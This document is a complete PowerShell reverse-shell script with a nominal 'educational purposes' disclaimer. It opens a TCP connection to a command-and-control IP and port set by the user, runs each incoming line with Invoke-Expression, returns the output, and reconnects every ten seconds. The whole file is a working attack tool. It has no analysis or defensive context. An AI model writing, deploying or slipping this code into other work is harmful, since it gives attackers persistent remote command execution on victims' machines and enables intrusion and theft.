# LEGAL USE ONLY - EDUCATIONAL PURPOSES
$C2_IP = "127.0.0.1"  # Replace with your C2 server IP
$C2_PORT = 4444

function Connect-ToC2 {
    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($C2_IP, $C2_PORT)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            $writer.AutoFlush = $true

            while ($client.Connected) {
                $cmd = $reader.ReadLine()
                if ($cmd -eq "exit") { break }
                try {
                    $output = (Invoke-Expression $cmd 2>&1 | Out-String)
                } catch {
                    $output = "[!] Error: $_`n"
                }
                $writer.WriteLine($output)
            }
            $client.Close()
        } catch {
            Start-Sleep -Seconds 10  # Reconnect after 10 seconds
        }
    }
}

Connect-ToC2